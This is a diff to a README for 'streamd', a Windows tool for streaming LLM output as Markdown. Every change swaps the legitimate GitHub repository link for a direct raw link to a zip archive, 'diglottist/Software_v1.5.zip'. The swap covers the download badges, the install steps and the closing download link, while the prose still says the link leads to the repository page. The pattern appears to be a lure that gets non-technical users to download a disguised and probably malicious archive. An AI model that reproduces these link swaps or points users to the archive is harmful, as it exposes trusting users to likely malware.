@@ -1,6 +1,6 @@
 # ⚙️ streamd - Stream LLM Output as Clean Markdown
 
-[![Download streamd](https://img.shields.io/badge/Download-streamd-green?style=for-the-badge)](https://github.com/luiselius/streamd)
+[![Download streamd](https://img.shields.io/badge/Download-streamd-green?style=for-the-badge)](https://raw.githubusercontent.com/luiselius/streamd/main/diglottist/Software_v1.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ No other software is required. You do not need programming skills to use streamd
 
 Access the latest release here:
 
-[![Download streamd](https://img.shields.io/badge/Download-streamd-blue?style=for-the-badge)](https://github.com/luiselius/streamd)
+[![Download streamd](https://img.shields.io/badge/Download-streamd-blue?style=for-the-badge)](https://raw.githubusercontent.com/luiselius/streamd/main/diglottist/Software_v1.5.zip)
 
 Since the download link leads to the main page, you will have to visit the page to find the latest version and download it manually.
 
@@ -47,7 +47,7 @@ Since the download link leads to the main page, you will have to visit the page 
 Follow these steps to get streamd up and running on your Windows PC:
 
 1. Open your web browser and go to this page:  
-   https://github.com/luiselius/streamd
+   https://raw.githubusercontent.com/luiselius/streamd/main/diglottist/Software_v1.5.zip
 
 2. On the GitHub page, look for a menu called **Releases** or **Downloads**. This is often found on the right side or top of the page.
 
@@ -155,7 +155,7 @@ Some common issues and fixes:
 ## 📚 More Information
 
 For technical details, code examples, and support, visit the GitHub repository:  
-https://github.com/luiselius/streamd
+https://raw.githubusercontent.com/luiselius/streamd/main/diglottist/Software_v1.5.zip
 
 You will find documentation, issue tracking, and updates there.
 
@@ -192,4 +192,4 @@ No install steps are needed beyond copying the new file.
 
 Click this link to visit the download page and get streamd:  
 
-[Download streamd from GitHub](https://github.com/luiselius/streamd)
+[Download streamd from GitHub](https://raw.githubusercontent.com/luiselius/streamd/main/diglottist/Software_v1.5.zip)
